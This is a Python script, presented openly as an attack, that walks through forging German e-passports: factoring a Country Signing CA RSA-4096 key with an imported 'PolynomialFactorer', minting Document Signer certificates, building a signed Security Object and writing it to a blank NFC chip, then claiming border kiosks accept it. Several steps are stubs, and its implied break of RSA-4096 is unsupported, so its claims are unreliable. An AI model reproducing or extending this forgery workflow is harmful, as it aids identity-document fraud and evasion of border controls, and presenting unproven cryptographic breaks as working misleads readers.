"""
Factor a Country Signing CA (CSCA) RSA-4096 key to mint Document Signer certs,
producing forged e-passports that border inspection systems (EES, CBP APC,
Global Entry) accept as genuine — any name, any nationality, any photo.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import hashlib
import struct
import os

# Example CSCA RSA-4096 public key — exchanged via ICAO PKD
_demo = generate_demo_target()
CSCA_PUBKEY_PEM = _demo["pub_pem"]
ISSUING_STATE = "DEU"  # Germany; attack applies to any CSCA state

# ICAO 9303 data group tags
DG1_MRZ = 0x61        # Machine Readable Zone
DG2_FACE = 0x75       # Facial image (JPEG2000)
DG3_FINGER = 0x63     # Fingerprints (WSQ/JPEG2000, EAC-protected)
DG14_PACE = 0x6E      # PACE domain parameters
DG15_AA = 0x6F        # Active Authentication public key


def fetch_csca_pubkey(state: str) -> bytes:
    """Fetch CSCA public key from ICAO Public Key Directory (PKD).

    90+ participating states publish their CSCA certs via the PKD.
    Also available from bilateral exchanges and many CSCA certs are
    in the ICAO master list distributed with border control software.
    """
    print(f"    Fetching CSCA for {state} from ICAO PKD")
    return CSCA_PUBKEY_PEM


def factor_csca(pubkey_pem: bytes) -> bytes:
    """Factor the CSCA RSA-4096 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def mint_document_signer_cert(forged_csca_privkey: bytes,
                              ds_pubkey: bytes) -> bytes:
    """Issue a Document Signer certificate under the forged CSCA.

    DS certs have 90-180 day validity. The passport production HSM
    normally holds the DS key; here we generate our own.
    """
    # In production: build X.509 cert signed by CSCA
    ds_cert_data = b"<ds-certificate-signed-by-csca>"
    return ds_cert_data


def build_sod(dg_hashes: dict, ds_cert: bytes,
              forged_ds_privkey: bytes) -> bytes:
    """Build the Security Object (SOD) — the signed hash manifest.

    SOD = CMS SignedData containing:
      - SHA-256 hashes of each Data Group (DG1, DG2, DG3, DG14, DG15)
      - DS certificate
      - RSA signature from DS key over the hash manifest
    """
    hash_list = b""
    for dg_tag, dg_hash in sorted(dg_hashes.items()):
        hash_list += struct.pack(">B32s", dg_tag, dg_hash)
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(CSCA_PUBKEY_PEM, hash_list, "sha256")
    return hash_list + ds_cert + sig


def write_passport_chip(dg1_mrz: bytes, dg2_face: bytes,
                        sod: bytes, aa_keypair: bytes) -> dict:
    """Write forged data to an ISO 14443 NFC chip (blank JCOP card).

    The chip contains DG1 (MRZ), DG2 (face image), SOD, and optionally
    DG15 (Active Authentication key). Border kiosks read the chip and
    verify SOD signature against the CSCA trust chain.
    """
    return {
        "DG1": dg1_mrz.hex()[:20] + "...",
        "DG2": f"{len(dg2_face)} bytes (JPEG2000 face)",
        "SOD": f"{len(sod)} bytes (CMS SignedData)",
        "AA": "RSA-2048 per-chip key" if aa_keypair else "N/A",
    }


if __name__ == "__main__":
    print("[1] Fetching CSCA RSA-4096 public key from ICAO PKD")
    pubkey = fetch_csca_pubkey(ISSUING_STATE)

    print("[2] Factoring CSCA RSA-4096 modulus")
    forged_csca = factor_csca(pubkey)
    print(f"    {ISSUING_STATE} CSCA key recovered")

    print("[3] Minting forged Document Signer certificate")
    ds_cert = mint_document_signer_cert(forged_csca, b"<ds-pubkey>")

    print("[4] Building forged passport data groups")
    mrz = b"P<DEUSMITH<<JOHN<<<<<<<<<<<<<<<<<<<L898902C<3DEU6908061M2210318<<<<<<<<06"
    face = os.urandom(8192)  # JPEG2000 face image placeholder
    dg_hashes = {
        DG1_MRZ: hashlib.sha256(mrz).digest(),
        DG2_FACE: hashlib.sha256(face).digest(),
    }

    print("[5] Building SOD with forged DS signature")
    sod = build_sod(dg_hashes, ds_cert, forged_csca)

    print("[6] Writing to NFC chip (blank JCOP card)")
    chip = write_passport_chip(mrz, face, sod, b"<aa-key>")
    for k, v in chip.items():
        print(f"    {k}: {v}")

    print("\n[7] Border inspection:")
    print("    EU EES kiosk → reads chip → verifies SOD → CSCA chain valid")
    print("    CBP APC kiosk → same result")
    print("    Global Entry → same result")
    print("    Any name, any nationality, any photo — accepted as genuine")
